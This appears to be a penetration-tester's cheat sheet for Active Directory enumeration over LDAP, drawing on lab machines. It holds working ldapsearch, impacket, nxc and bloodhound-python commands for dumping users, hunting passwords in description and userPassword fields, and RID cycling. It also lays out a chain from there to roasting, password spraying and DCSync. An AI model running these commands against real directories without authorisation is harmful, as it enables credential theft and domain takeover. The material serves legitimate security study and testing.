## Goal
Anonymous-bind and dump the directory: users, groups, computers, and description fields (passwords live there). LDAP(389) is core AD enum; feed BloodHound.

> LDAP is core AD enumeration. Drive the whole engagement from [[00_AD_METHODOLOGY]]; AD service index → [[00_AD_SERVICES]]. Turn graph edges into verified privilege changes → [[02_bloodhound_and_acl_paths]].

**Checklist**
- [ ] base DN found? (namingcontexts)
- [ ] anonymous bind dumps users?
- [ ] password in a description / userPassword field?
- [ ] user list extracted -> spray / AS-REP?
- [ ] BloodHound collected?

# Commands

### Step 1: Base DN + scripts
```bash
ldapsearch -x -H ldap://$IP -s base namingcontexts     # find base DN
nmap -p389,636 --script "ldap-rootdse,ldap-search" $IP
```

### Step 2: Anonymous dump
```bash
# all users + description + groups:
ldapsearch -x -H ldap://$IP -b "DC=corp,DC=local" "(&(objectCategory=person)(objectClass=user))" sAMAccountName description memberOf
# just usernames:
ldapsearch -x -H ldap://$IP -b "DC=corp,DC=local" "(objectClass=user)" sAMAccountName | grep sAMAccountName | awk '{print $2}'
# computers / groups:
ldapsearch -x -H ldap://$IP -b "DC=corp,DC=local" "(objectClass=computer)" name dNSHostName operatingSystem
ldapsearch -x -H ldap://$IP -b "DC=corp,DC=local" "(objectClass=group)" cn member
```

### Step 3: Hunt passwords in attributes
```bash
ldapsearch -x -H ldap://$IP -b "DC=corp,DC=local" "(&(objectClass=user)(description=*))" sAMAccountName description
ldapsearch -x -H ldap://$IP -b "DC=corp,DC=local" "(userPassword=*)" sAMAccountName userPassword
```

### Step 4: Authenticated dump + RID cycling
```bash
ldapsearch -x -H ldap://$IP -D "user@corp.local" -w 'password' -b "DC=corp,DC=local" "(objectClass=user)" sAMAccountName description
impacket-lookupsid corp.local/user:password@$IP 20000    # RID cycling for users
nxc ldap $IP -u user -p 'password' --users
nxc ldap $IP -u user -p 'password' --groups
nxc ldap $IP -u user -p 'password' --pass-pol            # check policy BEFORE spraying
```

### Step 5: BloodHound
```bash
bloodhound-python -u user -p 'password' -d corp.local -ns $IP -c all --zip
# import zip -> shortest path to DA, kerberoastable, DCSync rights, ADCS ESC1-9
```
Turning graph edges into verified privilege changes (prerequisites, abuse, verification, rollback) → [[02_bloodhound_and_acl_paths]]. Whole-domain loop → [[00_AD_METHODOLOGY]].

### Helpline
```bash
# READING BIND RESULTS: anonymous bind works = dump AD with NO creds (HTB Sauna/Cascade/Support).
#   "anonymous bind denied" = need creds -> RID-cycle via SMB (139_445_smb/anonymous_enum) instead.
# ATTRIBUTES THAT MATTER (grep the dump for these):
#   description: <text> -> passwords hide here (HTB Cicada/Cascade) -> try on SMB/WinRM/RDP.
#   userPassword: <b64> -> echo '<val>' | base64 -d.
#   memberOf: Domain Admins -> prioritize this account. memberOf: Remote Management Users -> WinRM-able (5985).
#   servicePrincipalName set -> Kerberoastable -> GetUserSPNs -> hashcat -m 13100.
# WHAT TO DO WITH A USER LIST: AS-REP roast (GetNPUsers) -> Kerberoast (if any cred) -> spray.
# BloodHound (bloodhound-python) reveals ACL abuse: WriteDACL/WriteOwner/GenericAll -> DCSync/ESC chains
#   (HTB Forest WriteDACL->DCSync). a referenced custom binary -> reverse it for hardcoded creds (HTB Support).
```
